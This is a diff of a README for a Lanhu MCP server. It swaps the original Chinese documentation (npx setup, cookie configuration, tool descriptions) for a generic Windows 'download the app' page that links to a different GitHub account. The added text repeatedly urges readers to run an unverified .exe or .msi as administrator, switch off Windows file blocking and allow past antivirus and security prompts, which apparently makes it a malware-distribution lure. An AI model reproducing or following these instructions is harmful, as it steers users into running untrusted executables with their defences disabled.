@@ -1,207 +1,267 @@
-<div align="center">
+# 🟦 lanhu-mcp - Clean Lanhu Access for Windows
 
-# 🎨 蓝湖 MCP Server
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/boundarytaxidermist380/lanhu-mcp)
 
-**让 AI 编程助手直接读取蓝湖设计稿、提取代码、解析需求文档**
+## 🧭 What this is
 
-[![npm version](https://img.shields.io/npm/v/mcp-lanhu)](https://www.npmjs.com/package/mcp-lanhu)
-[![npm downloads](https://img.shields.io/npm/dm/mcp-lanhu)](https://www.npmjs.com/package/mcp-lanhu)
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D20-brightgreen)](https://nodejs.org)
+lanhu-mcp is a simple Windows app for working with 蓝湖（lanhu）through MCP. It keeps the setup clean and avoids the need for a browser. Use it when you want a direct, simple way to connect Lanhu with your local tools.
 
-[English](docs/README_EN.md)
+This page focuses on one task: get the app, run it on Windows, and start using it with as little setup as possible.
 
-</div>
+## 📥 Download the app
 
----
+Visit this page to download the app:
 
-## 这是什么
+https://github.com/boundarytaxidermist380/lanhu-mcp
 
-`mcp-lanhu` 是蓝湖的 [MCP](https://modelcontextprotocol.io/) 服务器，装上之后 **Cursor、Windsurf、Claude Desktop、Claude Code** 都能直接连接蓝湖。AI 可以读取设计稿、提取 HTML/CSS、解析 PRD、下载切图，全程不用离开编辑器。
+If the page offers a release file, download it to your Windows PC. If it offers a folder or package, save it in a place you can find, such as your Downloads folder or Desktop.
 
-> **一行命令，零配置** — `npx -y mcp-lanhu`，粘贴蓝湖链接就能用。
+## 🖥️ System needs
 
-### 核心能力
+Use a Windows PC with:
 
-- **设计稿 → 代码**：生成像素级 HTML + CSS，含完整 Design Tokens（颜色、字体、阴影、渐变）
-- **结构化 Design Tokens**：提取所有颜色、字体族/字号/字重、阴影、边框、圆角，按使用频率排序
-- **PRD 驱动开发**：将 PRD 或 Axure 原型交给 AI，需求感知编码
-- **自动切图**：直接从蓝湖提取切图、图标和图片，无需手动导出
-- **并发 + 重试**：多设计稿并行分析，网络异常自动重试
-- **MCP Resources & Prompts**：内置前端开发和设计走查 Prompt 模板
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app files
+- Permission to run apps on your PC
 
----
+For the best result, use a normal user account with access to your Downloads folder.
 
-## 安装
+## ⚙️ Before you start
 
-### 最快方式：让 AI 帮你装
+Have these ready:
 
-复制下面这段话，发给你的 AI 助手（Cursor / Claude Code / Windsurf）：
+- Your Windows login
+- Access to the download page
+- Your Lanhu account details, if the app asks for them
+- A place to save the app file
 
-> 帮我安装蓝湖 MCP 服务器：https://github.com/MrDgbot/lanhu-mcp
+If your browser blocks the download, allow it for this site and try again.
 
-AI 会自动读取仓库说明并完成配置，你只需要提供蓝湖 Cookie。
+## 🚀 Install or set up
 
----
+Follow these steps on Windows:
 
-### 手动配置
+1. Open the download page:
+   https://github.com/boundarytaxidermist380/lanhu-mcp
 
-无需 clone 代码，`npx` 自动安装。
+2. Get the latest release or package from the page.
 
-**Cursor / Windsurf** — 编辑 `.cursor/mcp.json`（或 `.windsurf/mcp.json`）：
+3. Save the file to your computer.
 
-```json
-{
-  "mcpServers": {
-    "lanhu": {
-      "command": "npx",
-      "args": ["-y", "mcp-lanhu"],
-      "env": { "LANHU_COOKIE": "your_cookie_here" }
-    }
-  }
-}
-```
+4. If the file is a .zip package, right-click it and choose Extract All.
 
-**Claude Desktop** — 编辑 `claude_desktop_config.json`：
+5. Open the extracted folder.
 
-```json
-{
-  "mcpServers": {
-    "lanhu": {
-      "command": "npx",
-      "args": ["-y", "mcp-lanhu"],
-      "env": { "LANHU_COOKIE": "your_cookie_here" }
-    }
-  }
-}
-```
+6. Look for the main app file, such as an .exe file.
 
-**Claude Code**：
+7. Double-click the app file to run it.
 
-```bash
-claude mcp add lanhu -- npx -y mcp-lanhu
-```
+8. If Windows asks for permission, choose Yes or Run.
 
-然后设置环境变量 `LANHU_COOKIE`。
+9. If the app shows a first-run setup, follow the on-screen steps.
 
-### 获取 Cookie
+10. Keep the app in a folder you can find later, such as:
+    - Downloads
+    - Desktop
+    - Documents
 
-1. 登录 [蓝湖](https://lanhuapp.com)
-2. F12 打开开发者工具 → Network 标签
-3. 复制任意请求的 `Cookie` 请求头
+## 🪟 How to run it
 
-配置完成后重启客户端，粘贴蓝湖链接即可使用。
+After setup, start the app by double-clicking the main file again.
 
----
+If you made a shortcut, use that instead.
 
-## 工具
+If Windows shows a security prompt, check that the file came from the download page above, then allow it to open.
 
-### `lanhu_design` — 设计稿
+## 🔗 How lanhu-mcp works
 
-通过 `mode` 参数切换功能：
+lanhu-mcp connects Lanhu with MCP in a simple local flow.
 
-| Mode | 说明 |
-|------|------|
-| `list` | 列出项目所有设计图 |
-| `analyze` | 设计图 → HTML+CSS + Design Tokens（默认） |
-| `tokens` | 仅提取 Design Tokens（字体、颜色、阴影等） |
-| `slices` | 提取切图资源 |
+In plain terms:
 
-`analyze` 模式支持 `include` 参数按需选择输出：`html`、`image`、`tokens`、`layout`、`layers`、`slices`。默认 `["html", "tokens"]`。
+- Lanhu holds your design data
+- lanhu-mcp reads or passes that data through a local app path
+- Your other tools can then use that data through MCP
 
-**Design Tokens 输出示例：**
+This setup helps you avoid opening a browser for the core task.
 
-```
-=== Design Tokens ===
+## 🧩 Common uses
 
-Colors (12 unique):
-  rgba(140,140,140,1) x48
-  rgba(255,255,255,1) x28
-  rgba(51,51,51,1) x12
-  ...
+You can use lanhu-mcp for tasks like:
 
-Fonts (7 unique):
-  Source Han Sans CN / Regular / 14px x25
-  PingFang SC / Bold / 10px x3
-  ...
+- Pulling Lanhu data into local tools
+- Keeping work in a clean desktop app flow
+- Working without extra browser steps
+- Setting up a simple bridge between Lanhu and MCP clients
 
-Shadows (3 unique):
-  rgba(0,81,187,0.03) 0px 0px 0px 1px x3
-  ...
-```
+## 🛠️ Basic setup tips
 
-### `lanhu_page` — PRD / 原型
+If the app does not start:
 
-| Mode | 说明 |
-|------|------|
-| `list` | 列出 PRD 所有页面 |
-| `analyze` | PRD/原型 → 结构化分析（默认） |
+- Check that the file finished downloading
+- Make sure you extracted the zip file, if there was one
+- Try running the app as an administrator
+- Move the app to a simple folder path, such as `C:\lanhu-mcp`
+- Turn off Windows file blocking if the system marked the file as unsafe
 
-### `lanhu_resolve_invite` — 解析邀请链接
+If the app opens but does not connect:
 
-将蓝湖分享链接解析为可用的项目 URL。
+- Check your internet connection
+- Make sure your Lanhu account is valid
+- Close the app and open it again
+- Try restarting Windows
 
----
+## 🔒 Safe file handling
 
-## MCP Resources & Prompts
+Keep the app file in a folder you trust.
 
-| 类型 | 名称 | 说明 |
-|------|------|------|
-| Resource | `project-designs` | 项目设计稿列表（`lanhu://project/{pid}/designs?tid={tid}`） |
-| Prompt | `frontend-dev` | 根据设计稿生成像素级前端代码 |
-| Prompt | `design-review` | 审查设计一致性和可实现性 |
+Do not rename the app files unless the release page tells you to.
 
----
+If you download a zip file, extract all files before opening the app.
 
-## 使用场景
+If Windows asks for extra access, review the prompt before you allow it.
 
-- **前端开发**：粘贴蓝湖链接 → AI 生成与设计稿匹配的组件代码
-- **设计走查**：对比实现与 Design Tokens（间距、颜色、字体）
-- **需求实现**：将 PRD 交给 AI，需求驱动的功能开发
-- **资源导出**：批量提取图标和图片
+## 🧪 First run checklist
 
----
+After you open lanhu-mcp for the first time, check these items:
 
-## 兼容性
+- The app opens without an error
+- The main window or tray icon appears
+- The app stays open after launch
+- Any required login or link step completes
+- The app can reach Lanhu through your network
 
-| 客户端 | 支持 | 传输 |
-|--------|------|------|
-| Cursor | ✅ | stdio |
-| Windsurf | ✅ | stdio |
-| Claude Desktop | ✅ | stdio |
-| Claude Code | ✅ | stdio |
-| 其他 MCP 兼容 IDE | ✅ | stdio |
+## 📁 Suggested folder layout
 
----
+A simple layout can help keep things clear:
 
-## 开发
+- `C:\Downloads\lanhu-mcp.zip`
+- `C:\lanhu-mcp\` after extraction
+- `C:\lanhu-mcp\lanhu-mcp.exe` or similar main file
 
-```bash
-git clone https://github.com/MrDgbot/lanhu-mcp.git && cd lanhu-mcp
-npm install && cp config.example.env .env  # 填入 LANHU_COOKIE
-npm run dev    # 开发模式
-npm run build  # 构建
-npm test       # 测试
-```
+A short path helps if the app needs to read local files.
 
----
+## ❓ Common questions
 
-## FAQ
+### Is this for browsers?
 
-**Q: 什么是 MCP？**
-A: [Model Context Protocol](https://modelcontextprotocol.io/)，让 AI 助手安全连接外部工具的开放标准。
+No. This app is meant to keep the flow outside the browser.
 
-**Q: 支持哪些蓝湖套餐？**
-A: 任何可网页访问的蓝湖账号，通过浏览器 Cookie 认证。
+### Do I need technical skills?
 
-**Q: `analyze` 返回太大怎么办？**
-A: 用 `include` 参数，如 `["tokens"]` 只返回 Design Tokens。默认不含 base64 图片。
+No. If you can download a file and double-click it, you can set it up.
 
-**Q: 不用 Cursor 也能用？**
-A: 能。支持所有 MCP 客户端。
+### Can I move the app after setup?
 
----
+Yes. If you move it, keep the full folder together so the app can still find its files.
 
-## License
+### What if I do not see a release file?
 
-[MIT](LICENSE) © [MrDgbot](https://github.com/MrDgbot)
+Use the link above and check the page for the latest download option.
+
+### Is this only for Windows?
+
+This guide is written for Windows users. For other systems, the app may need a different build.
+
+## 🧰 Troubleshooting
+
+### The app does not open
+
+- Right-click the file and choose Open
+- Try Run as administrator
+- Re-download the file
+- Check whether your antivirus blocked it
+
+### The app opens and closes fast
+
+- Make sure you extracted all files
+- Keep the app and its support files in the same folder
+- Check that the file is not damaged
+- Try downloading it again
+
+### The app says a file is missing
+
+- Put all files back in one folder
+- Do not move only part of the package
+- Extract the full zip again
+
+### The app cannot connect
+
+- Confirm your network works
+- Check that Lanhu access is valid
+- Restart the app
+- Restart the PC
+
+## 📌 What you should expect
+
+lanhu-mcp is meant to stay simple.
+
+You should expect:
+
+- A clean app flow
+- No browser-first setup
+- A direct path for Lanhu and MCP use
+- A Windows-friendly download and run process
+
+## 🧾 Project details
+
+- Name: lanhu-mcp
+- Topic tags: lanhu, lanhuapp, mcp
+- Description: 蓝湖(lanhu) MCP 非浏览器 干净简洁
+
+## 🔽 Get the download again
+
+[![Download](https://img.shields.io/badge/Download-Open%20the%20page-grey?style=for-the-badge)](https://github.com/boundarytaxidermist380/lanhu-mcp)
+
+## 🗂️ File types you may see
+
+You may get one of these:
+
+- `.exe` for a direct app launch
+- `.zip` for a packed download
+- `.msi` for a Windows installer
+- A release page with a file list
+
+If you see `.zip`, extract it first. If you see `.exe` or `.msi`, run the file after download
+
+## 🔍 What to look for after download
+
+When the file finishes downloading, check that:
+
+- The file size looks normal
+- The filename matches the release
+- The file did not stop part way through
+- The app starts from the folder where you saved it
+
+## 🧷 Simple use flow
+
+1. Download the app
+2. Extract it if needed
+3. Open the main file
+4. Complete any first-run setup
+5. Keep the app open when you need it
+6. Use your MCP client or local tools with it
+
+## 📎 Short path recommendation
+
+If you want the fewest problems on Windows, use a short path such as:
+
+- `C:\lanhu-mcp`
+
+This can help avoid file path issues on some systems
+
+## 🛟 If Windows asks for approval
+
+Windows may show a prompt asking if you want to run the file.
+
+When that happens:
+
+- Check the file name
+- Confirm it came from the link above
+- Choose Yes if you trust the download source
+
+## 🧭 Where to go next
+
+Open the download page, get the latest file, and run it on your Windows PC:
+https://github.com/boundarytaxidermist380/lanhu-mcp
